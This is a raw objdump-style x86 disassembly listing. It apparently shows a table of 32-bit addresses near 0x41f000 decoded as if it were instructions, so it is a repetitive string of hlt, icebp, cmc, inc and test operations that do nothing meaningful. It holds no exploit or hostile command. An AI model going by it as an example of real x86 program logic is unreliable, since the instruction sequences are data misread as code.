  41b245:	hlt    
  41b246:	inc    ecx
  41b247:	add    BYTE PTR [eax],dl
  41b249:	test   BYTE PTR [ecx+0x0],0x64
  41b24d:	hlt    
  41b24e:	inc    ecx
  41b24f:	add    BYTE PTR [eax+0x140041f4],dh
  41b255:	test   BYTE PTR [ecx+0x0],0x78
  41b259:	cmc    
  41b25a:	inc    ecx
  41b25b:	add    BYTE PTR [esp+esi*8+0x41],bl
  41b25f:	add    BYTE PTR [eax-0x17ffbe0b],ah
  41b265:	hlt    
  41b266:	inc    ecx
  41b267:	add    BYTE PTR [eax],bl
  41b269:	test   BYTE PTR [ecx+0x0],0x1c
  41b26d:	test   BYTE PTR [ecx+0x0],0x20
  41b271:	test   BYTE PTR [ecx+0x0],0x1c
  41b275:	cmc    
  41b276:	inc    ecx
  41b277:	add    ah,cl
  41b279:	cmc    
  41b27a:	inc    ecx
  41b27b:	add    BYTE PTR [esi+esi*8],ah
  41b27e:	inc    ecx
  41b27f:	add    BYTE PTR [eax],ch
  41b281:	test   BYTE PTR [ecx+0x0],0x2c
  41b285:	test   BYTE PTR [ecx+0x0],0xd4
  41b289:	cmc    
  41b28a:	inc    ecx
  41b28b:	add    BYTE PTR [eax],dh
  41b28d:	test   BYTE PTR [ecx+0x0],0x5c
  41b291:	cmc    
  41b292:	inc    ecx
  41b293:	add    ah,al
  41b295:	hlt    
  41b296:	inc    ecx
  41b297:	add    BYTE PTR [eax-0xc],dh
  41b29a:	inc    ecx
  41b29b:	add    BYTE PTR [esi+esi*8],dh
  41b29e:	inc    ecx
  41b29f:	add    BYTE PTR [eax],bh
  41b2a1:	test   BYTE PTR [ecx+0x0],0x3c
  41b2a5:	test   BYTE PTR [ecx+0x0],0x40
  41b2a9:	test   BYTE PTR [ecx+0x0],0x44
  41b2ad:	test   BYTE PTR [ecx+0x0],0x48
  41b2b1:	test   BYTE PTR [ecx+0x0],0x4c
  41b2b5:	test   BYTE PTR [ecx+0x0],0xf8
  41b2b9:	cmc    
  41b2ba:	inc    ecx
  41b2bb:	add    al,bl
  41b2bd:	hlt    
  41b2be:	inc    ecx
  41b2bf:	add    BYTE PTR [eax-0xa],dl
  41b2c2:	inc    ecx
  41b2c3:	add    BYTE PTR [esi+esi*8+0x41],dl
  41b2c7:	add    BYTE PTR [eax-0xc],bh
  41b2ca:	inc    ecx
  41b2cb:	add    BYTE PTR [eax],dh
  41b2cd:	test   BYTE PTR [ecx+0x0],0x58
  41b2d1:	test   BYTE PTR [ecx+0x0],0x5c
  41b2d5:	test   BYTE PTR [ecx+0x0],0x88
  41b2d9:	hlt    
  41b2da:	inc    ecx
  41b2db:	add    BYTE PTR [eax-0xa],ah
  41b2de:	inc    ecx
  41b2df:	add    BYTE PTR [ebp+esi*8+0x41],dl
  41b2e3:	add    BYTE PTR [ebp+esi*8+0x41],bl
  41b2e7:	add    BYTE PTR [esi+esi*8+0x41],ah
  41b2eb:	add    ah,cl
  41b2ed:	cmc    
  41b2ee:	inc    ecx
  41b2ef:	add    BYTE PTR [ebp+esi*8+0x41],ch
  41b2f3:	add    BYTE PTR [eax-0x3bffbe0b],bl
  41b2f9:	hlt    
  41b2fa:	inc    ecx
  41b2fb:	add    BYTE PTR [eax],ah
  41b2fd:	test   BYTE PTR [ecx+0x0],0x20
  41b301:	cmc    
  41b302:	inc    ecx
  41b303:	add    BYTE PTR [eax-0xa],ch
  41b306:	inc    ecx
  41b307:	add    BYTE PTR [esi+esi*8],ah
  41b30a:	inc    ecx
  41b30b:	add    BYTE PTR [esi+esi*8+0x41],ch
  41b30f:	add    BYTE PTR [eax-0xa],dh
  41b312:	inc    ecx
  41b313:	add    BYTE PTR [esi*8-0x98bffbf],ch
  41b31a:	inc    ecx
  41b31b:	add    BYTE PTR [eax-0xa],ch
  41b31e:	inc    ecx
  41b31f:	add    BYTE PTR [ebp+esi*8+0x41],ch
  41b323:	add    BYTE PTR [eax-0xa],bh
  41b326:	inc    ecx
  41b327:	add    BYTE PTR [esi+esi*8+0x41],bh
  41b32b:	add    BYTE PTR [eax+0x80041f6],al
  41b331:	test   BYTE PTR [ecx+0x0],0x84
  41b335:	test   BYTE PTR [ecx+0x0],0x7c
  41b339:	test   BYTE PTR [ecx+0x0],0xdc
  41b33d:	cmc    
  41b33e:	inc    ecx
  41b33f:	add    BYTE PTR [esi+esi*8],al
  41b342:	inc    ecx
  41b343:	add    BYTE PTR [eax-0x73ffbe0a],cl
  41b349:	test   BYTE PTR [ecx+0x0],0x3c
  41b34d:	cmc    
  41b34e:	inc    ecx
  41b34f:	add    BYTE PTR [eax-0x6bffbe0a],dl
  41b355:	test   BYTE PTR [ecx+0x0],0x98
  41b359:	test   BYTE PTR [ecx+0x0],0x9c
  41b35d:	test   BYTE PTR [ecx+0x0],0xa0
  41b361:	test   BYTE PTR [ecx+0x0],0x3c
  41b365:	test   BYTE PTR [ecx+0x0],0x64
  41b369:	cmc    
  41b36a:	inc    ecx
  41b36b:	add    BYTE PTR [esi+esi*8-0x957ffbf],ah
  41b372:	inc    ecx
  41b373:	add    BYTE PTR [esi+esi*8-0x94fffbf],ch
  41b37a:	inc    ecx
  41b37b:	add    BYTE PTR [esi+esi*8-0xacbffbf],dh
  41b382:	inc    ecx
  41b383:	add    ah,dl
  41b385:	cmc    
  41b386:	inc    ecx
  41b387:	add    BYTE PTR [esi+esi*8],dl
  41b38a:	inc    ecx
  41b38b:	add    BYTE PTR [eax],ch
  41b38d:	test   BYTE PTR [ecx+0x0],0x90
  41b391:	hlt    
  41b392:	inc    ecx
  41b393:	add    BYTE PTR [esi+esi*8],cl
  41b396:	inc    ecx
  41b397:	add    BYTE PTR [eax-0x43ffbe0a],bh
  41b39d:	test   BYTE PTR [ecx+0x0],0xc0
  41b3a1:	test   BYTE PTR [ecx+0x0],0xd4
  41b3a5:	hlt    
  41b3a6:	inc    ecx
  41b3a7:	add    al,bl
  41b3a9:	cmc    
  41b3aa:	inc    ecx
  41b3ab:	add    ah,al
  41b3ad:	test   BYTE PTR [ecx+0x0],0x1c
  41b3b1:	cmc    
  41b3b2:	inc    ecx
  41b3b3:	add    BYTE PTR [eax],dh
  41b3b5:	cmc    
  41b3b6:	inc    ecx
  41b3b7:	add    BYTE PTR [esp+esi*8+0x41],ah
  41b3bb:	add    al,cl
  41b3bd:	test   BYTE PTR [ecx+0x0],0x9c
  41b3c1:	hlt    
  41b3c2:	inc    ecx
  41b3c3:	add    ah,cl
  41b3c5:	test   BYTE PTR [ecx+0x0],0xd0
  41b3c9:	test   BYTE PTR [ecx+0x0],0xd4
  41b3cd:	test   BYTE PTR [ecx+0x0],0x10
  41b3d1:	test   BYTE PTR [ecx+0x0],0xd8
  41b3d5:	test   BYTE PTR [ecx+0x0],0xdc
  41b3d9:	test   BYTE PTR [ecx+0x0],0xe0
  41b3dd:	test   BYTE PTR [ecx+0x0],0xe4
  41b3e1:	test   BYTE PTR [ecx+0x0],0x14
  41b3e5:	cmc    
  41b3e6:	inc    ecx
  41b3e7:	add    al,bl
  41b3e9:	test   BYTE PTR [ecx+0x0],0xe8
  41b3ed:	test   BYTE PTR [ecx+0x0],0xec
  41b3f1:	test   BYTE PTR [ecx+0x0],0xd8
  41b3f5:	test   BYTE PTR [ecx+0x0],0x10
  41b3f9:	cmc    
  41b3fa:	inc    ecx
  41b3fb:	add    al,al
  41b3fd:	cmc    
  41b3fe:	inc    ecx
  41b3ff:	add    BYTE PTR [eax-0xa],cl
  41b402:	inc    ecx
  41b403:	add    BYTE PTR [eax],dh
  41b405:	cmc    
  41b406:	inc    ecx
  41b407:	add    BYTE PTR [eax-0xa],dl
  41b40a:	inc    ecx
  41b40b:	add    al,dh
  41b40d:	test   BYTE PTR [ecx+0x0],0xf4
  41b411:	test   BYTE PTR [ecx+0x0],0xf0
  41b415:	hlt    
  41b416:	inc    ecx
  41b417:	add    BYTE PTR [esi+esi*8],ch
  41b41a:	inc    ecx
  41b41b:	add    al,bh
  41b41d:	test   BYTE PTR [ecx+0x0],0xa0
  41b421:	hlt    
  41b422:	inc    ecx
  41b423:	add    al,ch
  41b425:	hlt    
  41b426:	inc    ecx
  41b427:	add    BYTE PTR [esi+esi*8],al
  41b42a:	inc    ecx
  41b42b:	add    ah,bh
  41b42d:	test   BYTE PTR [ecx+0x0],0x0
  41b431:	test   DWORD PTR [ecx+0x0],0x41f548
  41b438:	add    al,0xf7
  41b43a:	inc    ecx
  41b43b:	add    BYTE PTR [eax-0x13ffbe0c],al
  41b441:	hlt    
  41b442:	inc    ecx
  41b443:	add    BYTE PTR [eax],cl
  41b445:	test   DWORD PTR [ecx+0x0],0x41f5d8
  41b44c:	or     al,0xf7
  41b44e:	inc    ecx
  41b44f:	add    ah,bh
  41b451:	hlt    
  41b452:	inc    ecx
  41b453:	add    BYTE PTR [eax],dl
  41b455:	test   DWORD PTR [ecx+0x0],0x41f47c
  41b45c:	adc    al,0xf7
  41b45e:	inc    ecx
  41b45f:	add    BYTE PTR [esi+esi*8],bl
  41b462:	inc    ecx
  41b463:	add    BYTE PTR [eax],bl
  41b465:	test   DWORD PTR [ecx+0x0],0x41f71c
  41b46c:	adc    al,0xf5
  41b46e:	inc    ecx
  41b46f:	add    BYTE PTR [eax],ch
  41b471:	cmc    
  41b472:	inc    ecx
  41b473:	add    BYTE PTR [esp+esi*8-0x94fffbf],bl
  41b47a:	inc    ecx
  41b47b:	add    al,dh
  41b47d:	hlt    
  41b47e:	inc    ecx
  41b47f:	add    BYTE PTR [eax],ah
  41b481:	test   DWORD PTR [ecx+0x0],0x41f724
  41b488:	(bad)  
  41b489:	test   BYTE PTR [ecx+0x0],0x4c
  41b48d:	test   BYTE PTR [ecx+0x0],0xb4
  41b491:	cmc    
  41b492:	inc    ecx
  41b493:	add    BYTE PTR [eax-0xb],dl
  41b496:	inc    ecx
  41b497:	add    BYTE PTR [esi+esi*8-0xa17ffbf],dl
  41b49e:	inc    ecx
  41b49f:	add    BYTE PTR [eax],ch
  41b4a1:	test   DWORD PTR [ecx+0x0],0x41f6cc
  41b4a8:	mov    al,ds:0x180041f5
  41b4ad:	test   DWORD PTR [ecx+0x0],0x41f72c
  41b4b4:	adc    dh,dh
  41b4b6:	inc    ecx
  41b4b7:	add    BYTE PTR [eax-0x3fffbe0c],dl
  41b4bd:	cmc    
  41b4be:	inc    ecx
  41b4bf:	add    BYTE PTR [eax],dh
  41b4c1:	test   DWORD PTR [ecx+0x0],0x41f734
  41b4c8:	fs cmc 
  41b4ca:	inc    ecx
  41b4cb:	add    al,dh
  41b4cd:	test   BYTE PTR [ecx+0x0],0x38
  41b4d1:	test   DWORD PTR [ecx+0x0],0x41f73c
  41b4d8:	or     al,0xf6
  41b4da:	inc    ecx
  41b4db:	add    BYTE PTR [eax-0x9],al
  41b4de:	inc    ecx
  41b4df:	add    BYTE PTR [edi+esi*8+0x41],al
  41b4e3:	add    BYTE PTR [esi+esi*8],ch
  41b4e6:	inc    ecx
  41b4e7:	add    BYTE PTR [esi*8-0xf87ffbf],ah
  41b4ee:	inc    ecx
  41b4ef:	add    BYTE PTR [eax+esi*8+0x41],bh
  41b4f3:	add    BYTE PTR [eax-0x7bffbe10],al
  41b4f9:	lock inc ecx
  41b4fb:	add    BYTE PTR [eax-0x73ffbe10],cl
  41b501:	lock inc ecx
  41b503:	add    BYTE PTR [eax-0x6bffbe10],dl
  41b509:	lock inc ecx
  41b50b:	add    BYTE PTR [eax-0x63ffbe10],bl
  41b511:	lock inc ecx
  41b513:	add    BYTE PTR [eax-0x5bffbe10],ah
  41b519:	lock inc ecx
  41b51b:	add    BYTE PTR [eax-0x53ffbe10],ch
  41b521:	lock inc ecx
  41b523:	add    BYTE PTR [eax-0x4bffbe10],dh
  41b529:	lock inc ecx
  41b52b:	add    BYTE PTR [eax-0x43ffbe10],bh
  41b531:	lock inc ecx
  41b533:	add    al,al
  41b535:	lock inc ecx
  41b537:	add    ah,al
  41b539:	lock inc ecx
  41b53b:	add    al,cl
  41b53d:	lock inc ecx
  41b53f:	add    ah,cl
  41b541:	lock inc ecx
  41b543:	add    al,dl
  41b545:	lock inc ecx
  41b547:	add    ah,dl
  41b549:	lock inc ecx
  41b54b:	add    al,bl
  41b54d:	lock inc ecx
  41b54f:	add    ah,bl
  41b551:	lock inc ecx
  41b553:	add    al,ah
  41b555:	lock inc ecx
  41b557:	add    ah,ah
  41b559:	lock inc ecx
  41b55b:	add    al,ch
  41b55d:	lock inc ecx
  41b55f:	add    ah,ch
  41b561:	lock inc ecx
  41b563:	add    al,dh
  41b565:	lock inc ecx
  41b567:	add    ah,dh
  41b569:	lock inc ecx
  41b56b:	add    al,bh
  41b56d:	lock inc ecx
  41b56f:	add    ah,bh
  41b571:	lock inc ecx
  41b573:	add    BYTE PTR [eax],al
  41b575:	icebp  
  41b576:	inc    ecx
  41b577:	add    BYTE PTR [ecx+esi*8],al
  41b57a:	inc    ecx
  41b57b:	add    BYTE PTR [eax],cl
  41b57d:	icebp  
  41b57e:	inc    ecx
  41b57f:	add    BYTE PTR [ecx+esi*8],cl
  41b582:	inc    ecx
  41b583:	add    BYTE PTR [eax],dl
  41b585:	icebp  
  41b586:	inc    ecx
  41b587:	add    BYTE PTR [ecx+esi*8],dl
  41b58a:	inc    ecx
  41b58b:	add    BYTE PTR [eax],bl
  41b58d:	icebp  
  41b58e:	inc    ecx
  41b58f:	add    BYTE PTR [ecx+esi*8],bl
  41b592:	inc    ecx
  41b593:	add    BYTE PTR [eax],ah
  41b595:	icebp  
  41b596:	inc    ecx
  41b597:	add    BYTE PTR [ecx+esi*8],ah
  41b59a:	inc    ecx
  41b59b:	add    BYTE PTR [eax],ch
  41b59d:	icebp  
  41b59e:	inc    ecx
  41b59f:	add    BYTE PTR [ecx+esi*8],ch
  41b5a2:	inc    ecx
  41b5a3:	add    BYTE PTR [eax],dh
  41b5a5:	icebp  
  41b5a6:	inc    ecx
  41b5a7:	add    BYTE PTR [ecx+esi*8],cl
  41b5aa:	inc    ecx
  41b5ab:	add    BYTE PTR [ecx+esi*8],dh
  41b5ae:	inc    ecx
  41b5af:	add    BYTE PTR [eax],bh
  41b5b1:	icebp  
  41b5b2:	inc    ecx
  41b5b3:	add    BYTE PTR [ecx+esi*8],bh
  41b5b6:	inc    ecx
  41b5b7:	add    BYTE PTR [eax-0xf],al
  41b5ba:	inc    ecx
  41b5bb:	add    BYTE PTR [ecx+esi*8+0x41],al
  41b5bf:	add    BYTE PTR [eax],ah
  41b5c1:	icebp  
  41b5c2:	inc    ecx
  41b5c3:	add    BYTE PTR [eax-0xf],cl
  41b5c6:	inc    ecx
  41b5c7:	add    BYTE PTR [ecx+esi*8+0x41],cl
  41b5cb:	add    BYTE PTR [eax-0xf],dl
  41b5ce:	inc    ecx
  41b5cf:	add    BYTE PTR [ecx+esi*8+0x41],dl
  41b5d3:	add    BYTE PTR [eax-0xf],bl
  41b5d6:	inc    ecx
  41b5d7:	add    BYTE PTR [ecx+esi*8+0x41],bl
  41b5db:	add    BYTE PTR [eax-0xf],ah
  41b5de:	inc    ecx
  41b5df:	add    BYTE PTR [ecx+esi*8+0x41],ah
  41b5e3:	add    BYTE PTR [eax-0xf],ch
  41b5e6:	inc    ecx
  41b5e7:	add    BYTE PTR [ecx+esi*8+0x41],ch
  41b5eb:	add    BYTE PTR [eax-0xf],dh
  41b5ee:	inc    ecx
  41b5ef:	add    BYTE PTR [ecx+esi*8+0x41],dh
  41b5f3:	add    BYTE PTR [eax-0xf],bh
  41b5f6:	inc    ecx
  41b5f7:	add    BYTE PTR [ecx+esi*8+0x41],bh
  41b5fb:	add    BYTE PTR [eax-0x7bffbe0f],al
  41b601:	icebp  
  41b602:	inc    ecx
  41b603:	add    BYTE PTR [eax-0x73ffbe0f],cl
  41b609:	icebp  
  41b60a:	inc    ecx
  41b60b:	add    BYTE PTR [eax-0x6bffbe0f],dl
  41b611:	icebp  
  41b612:	inc    ecx
  41b613:	add    BYTE PTR [eax-0x63ffbe0f],bl
  41b619:	icebp  
  41b61a:	inc    ecx
  41b61b:	add    BYTE PTR [eax-0x5bffbe0f],ah
  41b621:	icebp  
  41b622:	inc    ecx
  41b623:	add    BYTE PTR [eax-0x7fffbe0f],ch
  41b629:	icebp  
  41b62a:	inc    ecx
  41b62b:	add    BYTE PTR [ecx+esi*8-0xe6bffbf],ch
  41b632:	inc    ecx
  41b633:	add    BYTE PTR [eax+0x480041f1],dh
  41b639:	icebp  
  41b63a:	inc    ecx
  41b63b:	add    BYTE PTR [ecx+esi*8-0xe47ffbf],dh
  41b642:	inc    ecx
  41b643:	add    BYTE PTR [ecx+esi*8-0xe3fffbf],bh
  41b64a:	inc    ecx
  41b64b:	add    ah,al
  41b64d:	icebp  
  41b64e:	inc    ecx
  41b64f:	add    al,cl
  41b651:	icebp  
  41b652:	inc    ecx
  41b653:	add    ah,cl
  41b655:	icebp  
  41b656:	inc    ecx
  41b657:	add    BYTE PTR [ecx+esi*8-0xe2fffbf],al
  41b65e:	inc    ecx
  41b65f:	add    ah,dl
  41b661:	icebp  
  41b662:	inc    ecx
  41b663:	add    al,bl
  41b665:	icebp  
  41b666:	inc    ecx
  41b667:	add    ah,bl
  41b669:	icebp  
  41b66a:	inc    ecx
  41b66b:	add    al,ah
  41b66d:	icebp  
  41b66e:	inc    ecx
  41b66f:	add    ah,ah
  41b671:	icebp  
  41b672:	inc    ecx
  41b673:	add    al,ch
  41b675:	icebp  
  41b676:	inc    ecx
  41b677:	add    ah,ch
  41b679:	icebp  
  41b67a:	inc    ecx
  41b67b:	add    al,dh
  41b67d:	icebp  
  41b67e:	inc    ecx
  41b67f:	add    ah,dh
  41b681:	icebp  
  41b682:	inc    ecx
  41b683:	add    BYTE PTR [ecx+esi*8+0x41],bh
  41b687:	add    al,bh
  41b689:	icebp  
  41b68a:	inc    ecx
  41b68b:	add    ah,bh
  41b68d:	icebp  
  41b68e:	inc    ecx
  41b68f:	add    BYTE PTR [eax],al
  41b691:	repnz inc ecx
  41b693:	add    BYTE PTR [eax+0x40041f0],cl
  41b699:	repnz inc ecx
  41b69b:	add    BYTE PTR [eax],ah
  41b69d:	icebp  
  41b69e:	inc    ecx
  41b69f:	add    BYTE PTR [ecx+esi*8],ah
  41b6a2:	inc    ecx
  41b6a3:	add    BYTE PTR [eax],cl
  41b6a5:	repnz inc ecx
  41b6a7:	add    BYTE PTR [edx+esi*8],cl
  41b6aa:	inc    ecx
  41b6ab:	add    al,al
  41b6ad:	icebp  
  41b6ae:	inc    ecx
  41b6af:	add    BYTE PTR [eax],dl
  41b6b1:	repnz inc ecx
  41b6b3:	add    BYTE PTR [edx+esi*8],dl
  41b6b6:	inc    ecx
  41b6b7:	add    BYTE PTR [eax],bl
  41b6b9:	repnz inc ecx
  41b6bb:	add    BYTE PTR [edx+esi*8],bl
  41b6be:	inc    ecx
  41b6bf:	add    BYTE PTR [eax],ah
  41b6c1:	repnz inc ecx
  41b6c3:	add    ah,bh
  41b6c5:	icebp  
  41b6c6:	inc    ecx
  41b6c7:	add    BYTE PTR [edx+esi*8],ah
  41b6ca:	inc    ecx
  41b6cb:	add    BYTE PTR [eax],ch
  41b6cd:	repnz inc ecx
  41b6cf:	add    BYTE PTR [edx+esi*8],ch
  41b6d2:	inc    ecx
  41b6d3:	add    BYTE PTR [eax],dh
  41b6d5:	repnz inc ecx
  41b6d7:	add    ah,ah
  41b6d9:	icebp  
  41b6da:	inc    ecx
  41b6db:	add    BYTE PTR [edx+esi*8],dh
  41b6de:	inc    ecx
  41b6df:	add    BYTE PTR [eax],bh
  41b6e1:	repnz inc ecx
  41b6e3:	add    BYTE PTR [edx+esi*8],bh
  41b6e6:	inc    ecx
  41b6e7:	add    BYTE PTR [eax-0xe],al
  41b6ea:	inc    ecx
  41b6eb:	add    BYTE PTR [edx+esi*8+0x41],al
  41b6ef:	add    BYTE PTR [eax-0xe],cl
  41b6f2:	inc    ecx
  41b6f3:	add    BYTE PTR [edx+esi*8+0x41],cl
  41b6f7:	add    BYTE PTR [eax-0xe],dl
  41b6fa:	inc    ecx
  41b6fb:	add    BYTE PTR [edx+esi*8+0x41],dl
  41b6ff:	add    al,ah
  41b701:	icebp  
  41b702:	inc    ecx
  41b703:	add    BYTE PTR [eax-0xe],bl
  41b706:	inc    ecx
  41b707:	add    BYTE PTR [edx+esi*8+0x41],bl
  41b70b:	add    BYTE PTR [eax-0xe],ah
  41b70e:	inc    ecx
  41b70f:	add    BYTE PTR [edx+esi*8+0x41],ah
  41b713:	add    BYTE PTR [eax-0xe],ch
  41b716:	inc    ecx
  41b717:	add    BYTE PTR [edx+esi*8+0x41],ch
  41b71b:	add    BYTE PTR [eax-0xe],dh
  41b71e:	inc    ecx
  41b71f:	add    BYTE PTR [edx+esi*8+0x41],dh
  41b723:	add    BYTE PTR [eax-0xe],bh
  41b726:	inc    ecx
  41b727:	add    BYTE PTR [edx+esi*8+0x41],bh
  41b72b:	add    BYTE PTR [eax-0xf],cl
  41b72e:	inc    ecx
  41b72f:	add    BYTE PTR [eax-0x7bffbe0e],al
  41b735:	repnz inc ecx
  41b737:	add    BYTE PTR [eax-0x73ffbe0e],cl
  41b73d:	repnz inc ecx
  41b73f:	add    BYTE PTR [eax-0x6bffbe0e],dl
  41b745:	repnz inc ecx
  41b747:	add    BYTE PTR [eax-0x63ffbe0e],bl
  41b74d:	repnz inc ecx
  41b74f:	add    BYTE PTR [eax-0x5fffbe0f],dl
  41b755:	repnz inc ecx
  41b757:	add    BYTE PTR [edx+esi*8-0xd57ffbf],ah
  41b75e:	inc    ecx
  41b75f:	add    BYTE PTR [edx+esi*8-0xd4fffbf],ch
  41b766:	inc    ecx
  41b767:	add    BYTE PTR [edx+esi*8],al
  41b76a:	inc    ecx
  41b76b:	add    BYTE PTR [edx+esi*8-0xe4fffbf],dh
  41b772:	inc    ecx
  41b773:	add    BYTE PTR [eax+0x180041f2],bh
  41b779:	icebp  
  41b77a:	inc    ecx
  41b77b:	add    BYTE PTR [edx+esi*8+0x41],bh
  41b77f:	add    BYTE PTR [edx+esi*8-0xd3fffbf],bh
  41b786:	inc    ecx
  41b787:	add    ah,al
  41b789:	repnz inc ecx
  41b78b:	add    BYTE PTR [eax-0x37ffbe10],ah
  41b791:	repnz inc ecx
  41b793:	add    ah,cl
  41b795:	repnz inc ecx
  41b797:	add    al,dl
  41b799:	repnz inc ecx
  41b79b:	add    ah,dh
  41b79d:	lock inc ecx
  41b79f:	add    ah,dl
  41b7a1:	repnz inc ecx
  41b7a3:	add    al,bl
  41b7a5:	repnz inc ecx
  41b7a7:	add    ah,bl
  41b7a9:	repnz inc ecx
  41b7ab:	add    al,ah
  41b7ad:	repnz inc ecx
  41b7af:	add    ah,ah
  41b7b1:	repnz inc ecx
  41b7b3:	add    BYTE PTR [eax-0x17ffbe10],bl
  41b7b9:	repnz inc ecx
  41b7bb:	add    ah,ch
  41b7bd:	repnz inc ecx
  41b7bf:	add    al,dh
  41b7c1:	repnz inc ecx
  41b7c3:	add    ah,dh
  41b7c5:	repnz inc ecx
  41b7c7:	add    al,bh
  41b7c9:	repnz inc ecx
  41b7cb:	add    ah,bh
  41b7cd:	repnz inc ecx
  41b7cf:	add    BYTE PTR [eax],al
  41b7d1:	repz inc ecx
  41b7d3:	add    BYTE PTR [ebx+esi*8],al
  41b7d6:	inc    ecx
  41b7d7:	add    BYTE PTR [eax],cl
  41b7d9:	repz inc ecx
  41b7db:	add    BYTE PTR [ebx+esi*8],cl
  41b7de:	inc    ecx
  41b7df:	add    BYTE PTR [eax],dl
  41b7e1:	repz inc ecx
  41b7e3:	add    BYTE PTR [ebx+esi*8],dl
  41b7e6:	inc    ecx
  41b7e7:	add    BYTE PTR [eax],bl
  41b7e9:	repz inc ecx
  41b7eb:	add    BYTE PTR [ebx+esi*8],bl
  41b7ee:	inc    ecx
  41b7ef:	add    BYTE PTR [eax+esi*8-0xcdfffbf],cl
  41b7f6:	inc    ecx
  41b7f7:	add    BYTE PTR [ebx+esi*8],ah
  41b7fa:	inc    ecx
  41b7fb:	add    BYTE PTR [eax+0x280041f1],dl
  41b801:	repz inc ecx
  41b803:	add    BYTE PTR [ebx+esi*8],ch
  41b806:	inc    ecx
  41b807:	add    ah,ah
  41b809:	repnz inc ecx
  41b80b:	add    BYTE PTR [eax],dh
  41b80d:	repz inc ecx
  41b80f:	add    BYTE PTR [ebx+esi*8],dh
  41b812:	inc    ecx
  41b813:	add    BYTE PTR [eax],bh
  41b815:	repz inc ecx
  41b817:	add    BYTE PTR [eax+0x3c0041f2],dl
  41b81d:	repz inc ecx
  41b81f:	add    BYTE PTR [eax-0xd],al
  41b822:	inc    ecx
  41b823:	add    BYTE PTR [ebx+esi*8+0x41],al
  41b827:	add    BYTE PTR [eax-0xd],cl
  41b82a:	inc    ecx
  41b82b:	add    BYTE PTR [ebx+esi*8],dh
  41b82e:	inc    ecx
  41b82f:	add    BYTE PTR [edx+esi*8],al
  41b832:	inc    ecx
  41b833:	add    BYTE PTR [ebx+esi*8+0x41],cl
  41b837:	add    BYTE PTR [eax-0xd],dl
  41b83a:	inc    ecx
  41b83b:	add    BYTE PTR [ebx+esi*8+0x41],dl
  41b83f:	add    BYTE PTR [eax-0xd],bl
  41b842:	inc    ecx
  41b843:	add    BYTE PTR [eax-0xf],ch
  41b846:	inc    ecx
  41b847:	add    al,ah
  41b849:	lock inc ecx
  41b84b:	add    BYTE PTR [ebx+esi*8+0x41],bl
  41b84f:	add    BYTE PTR [eax-0xd],ah
  41b852:	inc    ecx
  41b853:	add    BYTE PTR [ebx+esi*8+0x41],ah
  41b857:	add    BYTE PTR [ecx+esi*8],cl
  41b85a:	inc    ecx
  41b85b:	add    BYTE PTR [eax-0xd],ch
  41b85e:	inc    ecx
  41b85f:	add    BYTE PTR [ebx+esi*8+0x41],ch
  41b863:	add    BYTE PTR [ecx+esi*8+0x41],cl
  41b867:	add    BYTE PTR [eax-0xd],dh
  41b86a:	inc    ecx
  41b86b:	add    BYTE PTR [ebx+esi*8+0x41],dh
  41b86f:	add    BYTE PTR [eax-0xd],bh
  41b872:	inc    ecx
  41b873:	add    al,ah
  41b875:	lock inc ecx
  41b877:	add    BYTE PTR [ebx+esi*8+0x41],bh
  41b87b:	add    BYTE PTR [eax-0xf],al
  41b87e:	inc    ecx
  41b87f:	add    BYTE PTR [eax-0x7bffbe0d],al
  41b885:	repz inc ecx
  41b887:	add    BYTE PTR [eax-0x73ffbe0d],cl
  41b88d:	repz inc ecx
  41b88f:	add    BYTE PTR [eax-0x6bffbe0d],dl
  41b895:	repz inc ecx
  41b897:	add    BYTE PTR [eax+esi*8+0x41],bh
  41b89b:	add    BYTE PTR [ebx+esi*8+0x41],ch
  41b89f:	add    ah,ah
  41b8a1:	icebp  
  41b8a2:	inc    ecx
  41b8a3:	add    BYTE PTR [eax-0x63ffbe0d],bl
  41b8a9:	repz inc ecx
  41b8ab:	add    BYTE PTR [eax-0x5bffbe0d],ah
  41b8b1:	repz inc ecx
  41b8b3:	add    BYTE PTR [eax-0x53ffbe0d],ch
  41b8b9:	repz inc ecx
  41b8bb:	add    BYTE PTR [eax-0x4bffbe0d],dh
  41b8c1:	repz inc ecx
  41b8c3:	add    BYTE PTR [eax-0x10],bh
  41b8c6:	inc    ecx
  41b8c7:	add    BYTE PTR [eax-0x43ffbe0d],bh
  41b8cd:	repz inc ecx
  41b8cf:	add    al,al
  41b8d1:	repz inc ecx
  41b8d3:	add    BYTE PTR [ebx+esi*8+0x41],cl
  41b8d7:	add    ah,al
  41b8d9:	repz inc ecx
  41b8db:	add    BYTE PTR [eax+esi*8-0xc37ffbf],cl
  41b8e2:	inc    ecx
  41b8e3:	add    BYTE PTR [ecx+esi*8],dh
  41b8e6:	inc    ecx
  41b8e7:	add    BYTE PTR [edx+esi*8],al
  41b8ea:	inc    ecx
  41b8eb:	add    ah,cl
  41b8ed:	repz inc ecx
  41b8ef:	add    al,dl
  41b8f1:	repz inc ecx
  41b8f3:	add    ah,dl
  41b8f5:	repz inc ecx
  41b8f7:	add    al,bl
  41b8f9:	repz inc ecx
  41b8fb:	add    ah,bl
  41b8fd:	repz inc ecx
  41b8ff:	add    al,ah
  41b901:	repz inc ecx
  41b903:	add    BYTE PTR [eax-0x1bffbe10],dh
  41b909:	repz inc ecx
  41b90b:	add    al,ch
  41b90d:	repz inc ecx
  41b90f:	add    ah,ch
  41b911:	repz inc ecx
  41b913:	add    al,dh
  41b915:	repz inc ecx
  41b917:	add    ah,dh
  41b919:	repz inc ecx
  41b91b:	add    al,bh
  41b91d:	repz inc ecx
  41b91f:	add    ah,bh
  41b921:	repz inc ecx
  41b923:	add    ah,dl
  41b925:	lock inc ecx
  41b927:	add    BYTE PTR [eax],al
  41b929:	hlt    
  41b92a:	inc    ecx
  41b92b:	add    BYTE PTR [esp+esi*8],al
  41b92e:	inc    ecx
  41b92f:	add    BYTE PTR [eax],cl
  41b931:	hlt    
  41b932:	inc    ecx
  41b933:	add    BYTE PTR [edx+esi*8],bl
  41b936:	inc    ecx
  41b937:	add    BYTE PTR [esp+esi*8],cl
  41b93a:	inc    ecx
  41b93b:	add    BYTE PTR [eax],dl
  41b93d:	hlt    
  41b93e:	inc    ecx
  41b93f:	add    al,ch
  41b941:	lock inc ecx
  41b943:	add    BYTE PTR [esp+esi*8],dl
  41b946:	inc    ecx
  41b947:	add    al,al
  41b949:	icebp  
  41b94a:	inc    ecx
  41b94b:	add    BYTE PTR [eax],bl
  41b94d:	hlt    
  41b94e:	inc    ecx
  41b94f:	add    BYTE PTR [esp+esi*8],bl
  41b952:	inc    ecx
  41b953:	add    BYTE PTR [eax],ah
  41b955:	hlt    
  41b956:	inc    ecx
